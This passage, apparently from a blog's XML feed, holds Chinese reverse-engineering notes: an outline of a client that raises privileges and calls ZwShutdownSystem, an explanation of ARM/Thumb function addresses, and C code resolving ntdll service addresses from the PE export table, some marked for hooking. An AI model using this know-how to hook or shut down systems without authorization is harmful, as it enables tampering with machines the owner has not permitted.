title="客户端"></a>客户端</h2><ol><li>LoadLibraryA(“Ntdll.DLL”)</li><li>GetProcAddress拿到ZwShutdownSystem关机。需要提权到关机权限，OpenProcessToken拿Token然后AdjustTokenPrivileges权限那一套，或者EnableSeDebugPrivilege</li><li>负责和服务端通信。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>arm和thumb</title>
      <link href="/2024/03/18/arm%E5%92%8Cthumb/"/>
      <url>/2024/03/18/arm%E5%92%8Cthumb/</url>
      
        <content type="html"><![CDATA[<h1 id="arm和thumb"><a href="#arm和thumb" class="headerlink" title="arm和thumb"></a>arm和thumb</h1><p><strong>为什么逆向的时候计算thumb地址是so 基址 + 函数在 so 中的偏移 + 1？</strong></p><p><a href="https://blog.csdn.net/tq384998430/article/details/119715531">【ARM】Thumb2指令集中函数的地址不对齐？_thumb 地址-CSDN博客</a></p><p>ARM指令集：</p><p>编代码全部是 32bits 的，每条指令能承载更多的信息，因此使用最少的指令完成功能， 所以在相同频率下运行速度也是最快的， 但也因为每条指令是32bits 的而占用了最多的程序空间。</p><p>Thumb指令集：</p><p>编代码全部是 16bits 的，每条指令所能承载的信息少，因此它需要使用更多的指令才能完成功能， 因此运行速度慢， 但它也占用了最少的程序空间</p><p>Thumb-2指令集：</p><p>在前面两者之间取了一个平衡， 兼有二者的优势， 当一个 操作可以使用一条 32bits指令完成时就使用 32bits 的指令， 加快运行速度， 而当一次操作只需要一条16bits 指令完成时就使用16bits 的指令，节约存储空间。</p><p>实验程序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span> (*p)(USART_TypeDef*,u8))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">Initialization</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.8X\r\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)main);</span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = (<span class="type">unsigned</span> <span class="type">int</span>)test;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.8X\r\n&quot;</span>, a);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ARM指令是4字节对齐的，Thumb-2指令是2字节对齐的，所以这里函数test的地址应该是2字节对齐的，但是打印出来的值却是：080014A9和080014FD。main函数的地址和test函数的地址都成了奇数地址了。</p><p>这个问题在于有些ARM处理器即能使用ARM指令，又能兼容Thumb指令，同一个应用程序中可能同时存在ARM指令和Thumb指令，这两者的处理方式肯定是大不相同的，所以为了切换ARM状态和Thumb状态，在跳转到Thumb指令编写的代码块的时候，将程序地址的最低位置1（因为不管是ARM指令还是Thumb指令，<strong>都至少是2字节对齐的，所以最低位一定是0，所以最低位可以拿来用于区分ARM状态和Thumb状态</strong>），这样处理器识别到最低位为1的话就会切换到Thumb状态，否则则是ARM状态。Thumb2指令集也是为了兼容以前的ARM状态和Thumb状态这样做的。</p><p>所以编译器编译STM32F1的程序的时候，会把函数的真实地址 <strong>加上1</strong> 作为常量放在ROM空间（如果这个函数的地址有被用到的话），获取函数的指针的时候就会获取到最低位被置1的一个地址。如下图，获取test的地址的时候，到0x080014F0地址处读取到了0x080014FD的值，这其实就是test的真实地址0x080014FC + 1得到的。</p><p>同样使用BX指令跳转时，+1就可以在.code16下继续执行。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取Ntdll函数与NtOS服务信息</title>
      <link href="/2024/03/09/%E8%8E%B7%E5%8F%96Ntdll%E5%87%BD%E6%95%B0%E4%B8%8ENtOS%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF/"/>
      <url>/2024/03/09/%E8%8E%B7%E5%8F%96Ntdll%E5%87%BD%E6%95%B0%E4%B8%8ENtOS%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="获取Ntdll常用服务信息和Ntos服务信息"><a href="#获取Ntdll常用服务信息和Ntos服务信息" class="headerlink" title="获取Ntdll常用服务信息和Ntos服务信息"></a>获取Ntdll常用服务信息和Ntos服务信息</h1><h2 id="Ntdll"><a href="#Ntdll" class="headerlink" title="Ntdll"></a>Ntdll</h2><p>公式 写好枚举等结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">    ZW_CREATE_THREAD = <span class="number">0</span>,</span><br><span class="line">    ZW_CREATE_THREAD_EX,</span><br><span class="line">    ZW_SUSPEND_THREAD,</span><br><span class="line">    ZW_SUSPEND_PROCESS,</span><br><span class="line">    ZW_PROTECT_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_SHUTDOWN_SYSTEM,</span><br><span class="line">    ZW_TERMINATE_THREAD,</span><br><span class="line">    ZW_SET_CONTEXT_THREAD,</span><br><span class="line">    ZW_TERMINATE_JOB_OBJECT,</span><br><span class="line">    ZW_SYSTEM_DEBUG_CONTROL,</span><br><span class="line">    ZW_CREATE_USER_PROCESS,</span><br><span class="line">    ZW_DEBUG_ACTIVE_PROCESS,</span><br><span class="line">    ZW_SET_SYSTEM_POWER_STATE,</span><br><span class="line">    ZW_INITIATE_POWER_ACTION,</span><br><span class="line">    ZW_QUEUE_APC_THREAD,</span><br><span class="line">    ZW_QUERY_INFORMATION_THREAD,</span><br><span class="line">    ZW_QUERY_INFORMATION_JOB_OBJECT,</span><br><span class="line">    ZW_READ_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_WRITE_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_TERMINATE_PROCESS,</span><br><span class="line">    ZW_CREATE_SECTION,</span><br><span class="line">    ZW_CREATE_PROCESS_EX,</span><br><span class="line">    ZW_CREATE_PAGING_FILE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// REG</span></span><br><span class="line">    ZW_OPEN_KEY,</span><br><span class="line">    ZW_CREATE_KEY,</span><br><span class="line">    ZW_DELETE_KEY,</span><br><span class="line">    ZW_DELETE_VALUE_KEY,</span><br><span class="line">    ZW_SET_VALUE_KEY,</span><br><span class="line">    ZW_QUERY_VALUE_KEY,</span><br><span class="line">    ZW_ENUMERATE_VALUE_KEY,</span><br><span class="line">    ZW_ENUMERATE_KEY,</span><br><span class="line">    ZW_QUERY_KEY,</span><br><span class="line">    ZW_CLOSE_HANDLE,</span><br><span class="line">    ZW_OPEN_KEY_EX,</span><br><span class="line">    ZW_RENAME_KEY,</span><br><span class="line">    ZW_RESTORE_KEY,</span><br><span class="line">    ZW_SET_SECURITY_OBJECT,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SYS</span></span><br><span class="line">    ZW_WRITE_FILE,</span><br><span class="line">    ZW_OPEN_SECTION,</span><br><span class="line">    ZW_LOAD_DRIVER,</span><br><span class="line">    ZW_SET_SYSTEM_INFORMATION,</span><br><span class="line">    ZW_REQUEST_WAIT_REPLY_PORT,</span><br><span class="line">    ZW_SET_SYSTEM_TIME,</span><br><span class="line">    ZW_DEVICE_IO_CONTROL_FILE,</span><br><span class="line">    ZW_REPLY_PORT,</span><br><span class="line">    ZW_UNMAP_VIEWOFSECTION,</span><br><span class="line">    ZW_FREE_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_ALPC_SEND_WAIT_RECEIVE_PORT,</span><br><span class="line">    ZW_RAISE_HARD_ERROR,</span><br><span class="line">    ZW_FS_CONTROL_FILE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PSMON </span></span><br><span class="line">    ZW_TEST_ALERT,</span><br><span class="line">    ZW_OPEN_PROCESS,</span><br><span class="line">    ZW_SET_INFORMATION_PROCESS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// time</span></span><br><span class="line">    ZW_SET_TIMER,</span><br><span class="line">    ZW_QUERY_VIRTUAL_MEMORY,</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&lt; FOR HOOK</span></span><br><span class="line">    ZW_DISPLAY_STRING,</span><br><span class="line">    </span><br><span class="line">    NT_DLL_INFOS,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line">&#125;NTDLL_INFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> NTDLL_INFO __NtdllInfos[NT_DLL_INFOS];</span><br></pre></td></tr></table></figure><p>写好函数名称</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeNtdllModule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    ULONG NumberOfServices = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;__NtdllInfos, <span class="number">0</span>, <span class="built_in">sizeof</span>(__NtdllInfos));</span><br><span class="line"></span><br><span class="line">   __NtdllInfos[ZW_CREATE_THREAD].ServiceName = <span class="string">&quot;NtCreateThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SUSPEND_THREAD].ServiceName = <span class="string">&quot;NtSuspendThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SUSPEND_PROCESS].ServiceName = <span class="string">&quot;NtSuspendProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_PROTECT_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtProtectVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SHUTDOWN_SYSTEM].ServiceName = <span class="string">&quot;NtShutdownSystem&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_THREAD].ServiceName = <span class="string">&quot;NtTerminateThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_CONTEXT_THREAD].ServiceName = <span class="string">&quot;NtSetContextThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_JOB_OBJECT].ServiceName = <span class="string">&quot;NtTerminateJobObject&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SYSTEM_DEBUG_CONTROL].ServiceName = <span class="string">&quot;NtSystemDebugControl&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DEBUG_ACTIVE_PROCESS].ServiceName = <span class="string">&quot;NtDebugActiveProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_POWER_STATE].ServiceName = <span class="string">&quot;NtSetSystemPowerState&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_INITIATE_POWER_ACTION].ServiceName = <span class="string">&quot;NtInitiatePowerAction&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUEUE_APC_THREAD].ServiceName = <span class="string">&quot;NtQueueApcThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_INFORMATION_THREAD].ServiceName = <span class="string">&quot;NtQueryInformationThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_INFORMATION_JOB_OBJECT].ServiceName = <span class="string">&quot;NtQueryInformationJobObject&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_READ_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtReadVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_WRITE_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtWriteVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_PROCESS].ServiceName = <span class="string">&quot;ZwTerminateProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_SECTION].ServiceName = <span class="string">&quot;ZwCreateSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_OPEN_PROCESS].ServiceName = <span class="string">&quot;NtOpenProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_INFORMATION_PROCESS].ServiceName = <span class="string">&quot;NtSetInformationProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_CREATE_THREAD_EX].ServiceName = <span class="string">&quot;NtCreateThreadEx&quot;</span>;</span><br><span class="line">       __NtdllInfos[ZW_CREATE_USER_PROCESS].ServiceName = <span class="string">&quot;NtCreateUserProcess&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   __NtdllInfos[ZW_OPEN_KEY].ServiceName = <span class="string">&quot;ZwOpenKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_KEY].ServiceName = <span class="string">&quot;ZwCreateKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DELETE_KEY].ServiceName = <span class="string">&quot;ZwDeleteKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DELETE_VALUE_KEY].ServiceName = <span class="string">&quot;ZwDeleteValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_VALUE_KEY].ServiceName = <span class="string">&quot;ZwSetValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_VALUE_KEY].ServiceName = <span class="string">&quot;ZwQueryValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_ENUMERATE_VALUE_KEY].ServiceName = <span class="string">&quot;ZwEnumerateValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_ENUMERATE_KEY].ServiceName = <span class="string">&quot;ZwEnumerateKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_KEY].ServiceName = <span class="string">&quot;ZwQueryKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CLOSE_HANDLE].ServiceName = <span class="string">&quot;ZwClose&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RENAME_KEY].ServiceName = <span class="string">&quot;ZwRenameKey&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_OPEN_KEY_EX].ServiceName = <span class="string">&quot;ZwOpenKeyEx&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// SYS</span></span><br><span class="line">   __NtdllInfos[ZW_WRITE_FILE].ServiceName = <span class="string">&quot;ZwWriteFile&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_OPEN_SECTION].ServiceName = <span class="string">&quot;ZwOpenSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_LOAD_DRIVER].ServiceName = <span class="string">&quot;ZwLoadDriver&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_INFORMATION].ServiceName = <span class="string">&quot;ZwSetSystemInformation&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_REQUEST_WAIT_REPLY_PORT].ServiceName = <span class="string">&quot;ZwRequestWaitReplyPort&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_TIME].ServiceName = <span class="string">&quot;ZwSetSystemTime&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DEVICE_IO_CONTROL_FILE].ServiceName = <span class="string">&quot;ZwDeviceIoControlFile&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RESTORE_KEY].ServiceName = <span class="string">&quot;ZwRestoreKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_REPLY_PORT].ServiceName = <span class="string">&quot;NtReplyPort&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_UNMAP_VIEWOFSECTION].ServiceName = <span class="string">&quot;ZwUnmapViewOfSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_FREE_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;ZwFreeVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_PROCESS_EX].ServiceName = <span class="string">&quot;NtCreateProcessEx&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RAISE_HARD_ERROR].ServiceName = <span class="string">&quot;NtRaiseHardError&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_FS_CONTROL_FILE].ServiceName = <span class="string">&quot;NtFsControlFile&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_ALPC_SEND_WAIT_RECEIVE_PORT].ServiceName = <span class="string">&quot;NtAlpcSendWaitReceivePort&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// PSMON</span></span><br><span class="line">   __NtdllInfos[ZW_TEST_ALERT].ServiceName = <span class="string">&quot;NtTestAlert&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Timer</span></span><br><span class="line">   __NtdllInfos[ZW_SET_TIMER].ServiceName = <span class="string">&quot;NtSetTimer&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;ZwQueryVirtualMemory&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NT_DLL_INFOS; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (__NtdllInfos[i].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           NumberOfServices++;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">GetNtServiceAddress</span>(NumberOfServices);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取函数地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddress</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__OsVersion == WIN10_VERSION_10240)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">GetNtServiceAddressInternal1</span>(NumberOfServices);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">GetNtServiceAddressInternal2</span>(NumberOfServices);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析PE结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddressInternal1</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* ImageDosHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32* ImageOptionalHeader32;</span><br><span class="line">    IMAGE_EXPORT_DIRECTORY* ImageExportDirectory;</span><br><span class="line"></span><br><span class="line">    ULONG* AddressOfFunctions;</span><br><span class="line">    ULONG* AddressOfNames;</span><br><span class="line">    USHORT* AddressOfNameOrdinals;</span><br><span class="line">    ULONG Ordinals;</span><br><span class="line">    ULONG i, ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line"></span><br><span class="line">    ULONG j = <span class="number">0</span>;</span><br><span class="line">    ULONG k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = __NtdllImageBase;</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        ImageDosHeader = (IMAGE_DOS_HEADER*)v1;</span><br><span class="line">        ImageOptionalHeader32 = (IMAGE_OPTIONAL_HEADER32*)((UINT8*)v1 + ImageDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">        ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((UINT8*)v1 + ImageOptionalHeader32-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">        AddressOfFunctions = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">        AddressOfNames = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">        AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i];</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NT_DLL_INFOS; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__NtdllInfos[j].ServiceAddress == <span class="literal">NULL</span> &amp;&amp; __NtdllInfos[j].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (_stricmp(ServiceName, __NtdllInfos[j].ServiceName) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        __NtdllInfos[j].ServiceAddress = (PVOID)ServiceAddress;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                